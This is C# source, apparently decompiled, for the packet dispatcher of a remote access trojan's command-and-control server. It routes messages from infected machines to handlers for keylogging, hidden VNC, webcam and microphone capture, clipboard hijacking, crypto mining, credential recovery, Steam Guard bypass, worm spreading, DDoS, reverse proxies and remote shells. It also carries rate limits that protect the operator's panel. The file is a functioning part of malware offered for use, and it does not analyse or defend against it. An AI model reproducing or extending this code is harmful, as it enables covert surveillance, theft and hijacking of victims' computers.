using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class Packet
{
	private const int MaxRecoveryRequestsPerMinute = 10;

	private const int MaxDataSize = 52428800;

	private static readonly ConcurrentDictionary<string, List<DateTime>> _recoveryRequests = new ConcurrentDictionary<string, List<DateTime>>();

	private static readonly ConcurrentDictionary<string, ConcurrentDictionary<string, List<DateTime>>> _handlerRateLimit = new ConcurrentDictionary<string, ConcurrentDictionary<string, List<DateTime>>>();

	private static readonly TimeSpan _handlerRateWindow = TimeSpan.FromSeconds(5.0);

	private const int MaxLogMessagesPerHandler = 10;

	private const int MaxPingPerWindow = 30;

	private static readonly ConcurrentDictionary<string, DateTime> _blacklistedIPs = new ConcurrentDictionary<string, DateTime>();

	private static readonly ConcurrentDictionary<string, int> _unauthPacketCount = new ConcurrentDictionary<string, int>();

	private static readonly ConcurrentDictionary<string, DateTime> _unauthPacketWindow = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _blacklistDuration = TimeSpan.FromMinutes(5.0);

	private const int MaxUnauthPacketsPerSecond = 30;

	private static bool IsHandlerFlooding(string clientKey, string handler, int maxCount)
	{
		List<DateTime> timestamps = _handlerRateLimit.GetOrAdd(clientKey, (string _) => new ConcurrentDictionary<string, List<DateTime>>()).GetOrAdd(handler, (string _) => new List<DateTime>());
		DateTime now = DateTime.UtcNow;
		lock (timestamps)
		{
			timestamps.RemoveAll((DateTime t) => now - t > _handlerRateWindow);
			if (timestamps.Count >= maxCount)
			{
				return true;
			}
			timestamps.Add(now);
			return false;
		}
	}

	private static bool IsBlacklisted(string ip)
	{
		if (_blacklistedIPs.TryGetValue(ip, out var banUntil))
		{
			if (DateTime.UtcNow < banUntil)
			{
				return true;
			}
			_blacklistedIPs.TryRemove(ip, out var _);
		}
		return false;
	}

	private static void BlacklistIP(string ip)
	{
		_blacklistedIPs[ip] = DateTime.UtcNow.Add(_blacklistDuration);
		Methods.AppendLogs("AntiDDoS", $"RCE Attack Blocked! IP {ip} - DDoS detected. Blocked for {_blacklistDuration.TotalMinutes} min", Color.Red);
	}

	public void Read(Clients client, byte[] data)
	{
		try
		{
			if (data == null || data.Length > 52428800)
			{
				client.Disconnect();
				return;
			}
			string ip = client.IP;
			if (!(ip == "127.0.0.1") && !(ip == "::1") && !ip.StartsWith("127.") && !(ip == "[::1]"))
			{
				if (IsBlacklisted(ip))
				{
					client.Disconnect();
					return;
				}
				if (client.Hwid == null)
				{
					DateTime now = DateTime.UtcNow;
					if (_unauthPacketWindow.TryGetValue(ip, out var windowStart) && (now - windowStart).TotalSeconds < 1.0)
					{
						if (_unauthPacketCount.AddOrUpdate(ip, 1, (string k, int v) => v + 1) > 30)
						{
							BlacklistIP(ip);
							client.Disconnect();
							return;
						}
					}
					else
					{
						_unauthPacketWindow[ip] = now;
						_unauthPacketCount[ip] = 1;
					}
				}
			}
			string clientKey = ip + ":" + (client.Hwid ?? "new");
			object[] array;
			try
			{
				array = LEB128.Read(data);
				if (array == null || array.Length == 0 || !(array[0] is string))
				{
					client.Disconnect();
					return;
				}
				if (array[0] is string command && command == "Recovery")
				{
					List<DateTime> recoveryTimes = _recoveryRequests.GetOrAdd(clientKey, (string _) => new List<DateTime>());
					DateTime currentRequestTime = DateTime.UtcNow;
					lock (recoveryTimes)
					{
						recoveryTimes.RemoveAll((DateTime t) => (currentRequestTime - t).TotalMinutes > 1.0);
						if (recoveryTimes.Count >= 10)
						{
							return;
						}
						recoveryTimes.Add(currentRequestTime);
					}
				}
			}
			catch (Exception)
			{
				client.Disconnect();
				return;
			}
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 3:
				switch (text[0])
				{
				case 'M':
					if (text == "Map")
					{
						HandlerMap.Read(client, array);
					}
					break;
				case 'F':
					if (text == "Fun")
					{
						HandlerFun.Read(client, array);
					}
					break;
				}
				break;
			case 4:
				switch (text)
				{
				case "Nmap":
					HandlerNmap.Read(client, array);
					break;
				case "Wifi":
					HandlerWifi.Read(client, array);
					break;
				case "Chat":
					HandlerChat.Read(client, array);
					break;
				default:
					switch (text[1])
					{
					case 'V':
						if (text == "HVNC")
						{
							HandlerHVNC.Read(client, array);
						}
						break;
					case 'D':
						if (text == "DDos")
						{
							HandlerDDos.Read(client, array);
						}
						break;
					case 'o':
						if (text == "Pong" && !IsHandlerFlooding(clientKey, "Pong", 30))
						{
							HandlerPong.Read(client, array);
						}
						break;
					case 'i':
						if (text == "Ping" && !IsHandlerFlooding(clientKey, "Ping", 30))
						{
							HandlerPing.Read(client, array);
						}
						break;
					}
					break;
				}
				break;
			case 5:
				switch (text[0])
				{
				case 'P':
					if (text == "Piano")
					{
						HandlerPiano.Read(client, array);
					}
					else if (text == "Paint")
					{
						HandlerPaint.Read(client, array);
					}
					break;
				case 'S':
					if (text == "Shell")
					{
						HandlerShell.Read(client, array);
					}
					else if (text == "Sound")
					{
						HandlerSound.Read(client, array);
					}
					break;
				case 'E':
					if (text == "Error")
					{
						HandlerError.Read(client, array);
					}
					break;
				}
				break;
			case 6:
				switch (text[0])
				{
				case 'R':
					if (text == "Report" && !IsHandlerFlooding(clientKey, "Report", 10))
					{
						string reportMsg = (string)array[1];
						if (reportMsg != null && reportMsg.Length > 200)
						{
							reportMsg = reportMsg.Substring(0, 200) + "...";
						}
						Methods.AppendLogs(client.IP, "Window Report " + client.Hwid + ": " + reportMsg, Color.Purple);
					}
					break;
				case 'U':
					if (text == "Update" && !IsHandlerFlooding(clientKey, "Update", 10))
					{
						string updateMsg = (string)array[1];
						if (updateMsg != null && updateMsg.Length > 200)
						{
							updateMsg = updateMsg.Substring(0, 200) + "...";
						}
						Methods.AppendLogs(client.IP, "Succues Update: " + updateMsg, Color.Green);
					}
					break;
				case 'V':
					if (text == "Volume")
					{
						HandlerVolume.Read(client, array);
					}
					break;
				case 'W':
					if (text == "Window")
					{
						HandlerWindow.Read(client, array);
					}
					break;
				case 'G':
					if (text == "GetDLL")
					{
						HandlerGetDLL.Read(client, array);
					}
					break;
				case 'C':
					if (text == "Camera")
					{
						HandlerCamera.Read(client, array);
					}
					else if (text == "Config")
					{
						HandlerConfig.Read(client, array);
					}
					break;
				}
				break;
			case 7:
				switch (text[3])
				{
				case 'k':
					if (text == "Desktop")
					{
						HandlerDesktop.Read(client, array);
					}
					break;
				case 'm':
					if (text == "WormLog" && !IsHandlerFlooding(clientKey, "WormLog", 10))
					{
						string wormMsg = (string)array[1];
						if (wormMsg != null && wormMsg.Length > 300)
						{
							wormMsg = wormMsg.Substring(0, 300) + "...";
						}
						Methods.AppendLogs(client.IP, wormMsg, Color.DarkBlue);
					}
					break;
				case 'n':
					if (text == "Connect")
					{
						HandlerConnect.Read(client, array);
					}
					else if (text == "Scanner")
					{
						HandlerScanner.Read(client, array);
					}
					break;
				case 'o':
					if (text == "AutoRun")
					{
						HandlerAutoRun.Read(client, array);
					}
					break;
				case 'p':
					if (text == "Clipper")
					{
						HandlerClipper.Read(client, array);
					}
					break;
				case 'f':
					if (text == "Sniffer")
					{
						HandlerSniffer.Read(client, array);
					}
					break;
				case 's':
					if (text == "Netstat")
					{
						HandlerNetstat.Read(client, array);
					}
					break;
				case 'v':
					if (text == "Service")
					{
						HandlerService.Read(client, array);
					}
					break;
				case 'w':
					if (text == "Browser")
					{
						HandlerBrowser.Read(client, array);
					}
					break;
				case 'e':
					if (!(text == "Regedit"))
					{
						if (text == "Notepad")
						{
							HandlerNotepad.Read(client, array);
						}
					}
					else
					{
						HandlerRegedit.Read(client, array);
					}
					break;
				case 'c':
					if (text == "Process")
					{
						HandlerProcess.Read(client, array);
					}
					break;
				}
				break;
			case 8:
				switch (text)
				{
				case "Hardware":
					HandlerHardware.Read(client, array);
					break;
				case "Firewall":
					HandlerFirewall.Read(client, array);
					break;
				case "FunAudio":
					HandlerFunAudio.Read(client, array);
					break;
				default:
					switch (text[5])
					{
					case 'a':
						if (text == "Programs")
						{
							HandlerPrograms.Read(client, array);
						}
						break;
					case 'X':
						if (text == "MinerXmr")
						{
							HandlerMinerXmr.Read(client, array);
						}
						break;
					case 'E':
						if (text == "MinerEtc")
						{
							HandlerMinerEtc.Read(client, array);
						}
						else if (text == "EventLog")
						{
							HandlerEventLog.Read(client, array);
						}
						break;
					case 'r':
						if (text == "Explorer")
						{
							HandlerExplorer.Read(client, array);
						}
						break;
					case 'o':
						if (!(text == "WormLog1"))
						{
							if (text == "WormLog2" && !IsHandlerFlooding(clientKey, "WormLog2", 10))
							{
								string worm2Msg = (string)array[1];
								if (worm2Msg != null && worm2Msg.Length > 300)
								{
									worm2Msg = worm2Msg.Substring(0, 300) + "...";
								}
								Methods.AppendLogs(client.IP, worm2Msg, Color.DarkSeaGreen);
							}
						}
						else if (!IsHandlerFlooding(clientKey, "WormLog1", 10))
						{
							string worm1Msg = (string)array[1];
							if (worm1Msg != null && worm1Msg.Length > 300)
							{
								worm1Msg = worm1Msg.Substring(0, 300) + "...";
							}
							Methods.AppendLogs(client.IP, worm1Msg, Color.DarkOrange);
						}
						break;
					case 'e':
						if (text == "Recovery")
						{
							HandlerRecovery.Read(client, array);
						}
						break;
					}
					break;
				}
				break;
			case 9:
			{
				char c = text[0];
				if (c == 'A')
				{
					if (text == "AiControl")
					{
						HandlerAiControl.Read(client, array);
					}
					break;
				}
				if (c <= 'H')
				{
					switch (c)
					{
					case 'H':
						if (text == "HostsFile")
						{
							HandlerHostsFile.Read(client, array);
						}
						break;
					default:
						if (text == "BotKiller")
						{
							HandlerBotKiller.Read(client, array);
						}
						break;
					case 'C':
						if (text == "Clipboard")
						{
							HandlerClipboard.Read(client, array);
						}
						break;
					}
					break;
				}
				switch (c)
				{
				case 'U':
					if (text == "Uninstall" && !IsHandlerFlooding(clientKey, "Uninstall", 10))
					{
						string uninstMsg = (string)array[1];
						if (uninstMsg != null && uninstMsg.Length > 200)
						{
							uninstMsg = uninstMsg.Substring(0, 200) + "...";
						}
						Methods.AppendLogs(client.IP, "Succues Uninstall: " + uninstMsg, Color.Green);
					}
					break;
				case 'R':
					if (text == "Recovery1")
					{
						HandlerRecovery1.Read(client, array);
					}
					break;
				case 'K':
					if (text == "KeyLogger")
					{
						HandlerKeyLogger.Read(client, array);
					}
					break;
				}
				break;
			}
			case 10:
				switch (text[0])
				{
				case 'M':
					if (text == "Microphone")
					{
						HandlerMicrophone.Read(client, array);
					}
					else if (text == "MinerRigel")
					{
						HandlerMinerRigel.Read(client, array);
					}
					break;
				case 'H':
					if (text == "HRDPInstall")
					{
						HandlerRDP.Read(client, array);
					}
					break;
				case 'P':
					if (text == "PowerShell")
					{
						HandlerPowerShell.Read(client, array);
					}
					break;
				case 'A':
					if (text == "ArpScanner")
					{
						HandlerArpScanner.Read(client, array);
					}
					break;
				case 'B':
					if (text == "BotSpeaker")
					{
						HandlerBotSpeaker.Read(client, array);
					}
					break;
				}
				break;
			case 11:
				switch (text[2])
				{
				case 's':
					if (text == "SystemSound")
					{
						HandlerSystemSound.Read(client, array);
					}
					break;
				case 'G':
					if (text == "HzGenerator")
					{
						HandlerHzGenerator.Read(client, array);
					}
					break;
				case 'r':
					if (text == "Performance")
					{
						HandlerPerformance.Read(client, array);
					}
					break;
				case 'n':
					if (text == "SendDiskGet")
					{
						HandlerSendDiskGet.Read(client, array);
					}
					break;
				}
				break;
			case 12:
				if (text == "PlayitGrabber")
				{
					HandlerPlayitGrabber.Read(client, array);
					break;
				}
				switch (text[2])
				{
				case 'l':
					if (text == "FileSearcher")
					{
						HandlerFileSearcher.Read(client, array);
					}
					break;
				case 'n':
					if (text == "SendFileDisk" && !IsHandlerFlooding(clientKey, "SendFileDisk", 10))
					{
						string fileMsg = (string)array[1];
						if (fileMsg != null && fileMsg.Length > 200)
						{
							fileMsg = fileMsg.Substring(0, 200) + "...";
						}
						Methods.AppendLogs(client.IP, "Succues File: " + fileMsg, Color.Green);
					}
					break;
				case 'p':
					if (text == "ReportWindow")
					{
						HandlerReportWindow.Read(client, array);
					}
					break;
				case 'v':
					if (text == "ReverseProxy")
					{
						HandlerReverseProxy.Read(client, array);
					}
					break;
				}
				break;
			case 13:
				switch (text)
				{
				case "TaskScheduler":
					HandlerTaskSheduler.Read(client, array);
					break;
				case "DriverManager":
					HandlerDriverManager.Read(client, array);
					break;
				case "ReverseTunnel":
					HandlerReverseTunnel.Read(client, array);
					break;
				default:
					switch (text[12])
					{
					case 'U':
						if (text == "ReverseProxyU")
						{
							HandlerReverseProxyU.Read(client, array);
						}
						break;
					case 'R':
						if (text == "ReverseProxyR")
						{
							HandlerReverseProxyR.Read(client, array);
						}
						break;
					case 'n':
						if (text == "FullImageOpen")
						{
							HandlerFullImageOpen.Read(client, array);
						}
						break;
					case 't':
						if (text == "SendMemoryGet")
						{
							HandlerSendMemoryGet.Read(client, array);
						}
						break;
					case 'r':
						if (text == "DeviceManager")
						{
							HandlerDeviceManager.Read(client, array);
						}
						break;
					}
					break;
				}
				break;
			case 14:
				switch (text)
				{
				case "ReverseForward":
					HandlerReverseForward.Read(client, array);
					break;
				case "CSharpCompiler":
					HandlerCSharpCompiler.Read(client, array);
					break;
				case "DiskManagement":
					HandlerDiskManagement.Read(client, array);
					break;
				default:
					switch (text[0])
					{
					case 'S':
						if (text == "SendFileMemory")
						{
							if (!IsHandlerFlooding(clientKey, "SendFileMemory", 10))
							{
								string injectMsg = (string)array[1];
								if (injectMsg != null && injectMsg.Length > 200)
								{
									injectMsg = injectMsg.Substring(0, 200) + "...";
								}
								Methods.AppendLogs(client.IP, "Succues Inject: " + injectMsg, Color.Green);
							}
						}
						else if (text == "SteamGuardBypass")
						{
							HandlerSteamGuard.Read(client, array);
						}
						break;
					case 'K':
						if (text == "KeyLoggerPanel")
						{
							HandlerKeyLoggerPanel.Read(client, array);
						}
						break;
					}
					break;
				}
				break;
			case 15:
				if (text == "WindowsRestores")
				{
					HandlerWindowsRestores.Read(client, array);
				}
				break;
			case 17:
				if (text == "NetExecutorResult")
				{
					HandlerNetExecutor.Read(client, array);
				}
				else if (text == "WindowsCustomizer")
				{
					HandlerWindowsCustomizer.Read(client, array);
				}
				break;
			case 18:
				if (text == "NetExecutorPlugin")
				{
					HandlerNetExecutor.Read(client, array);
				}
				break;
			case 21:
				if (text == "Desktop Demonstration")
				{
					HandlerDesktopDemonstration.Read(client, array);
				}
				else if (text == "Camera Demonstration")
				{
					HandlerCameraDemonstration.Read(client, array);
				}
				break;
			case 16:
			case 19:
			case 20:
				break;
			}
		}
		catch (Exception ex2)
		{
			Console.WriteLine(ex2.ToString());
		}
	}
}
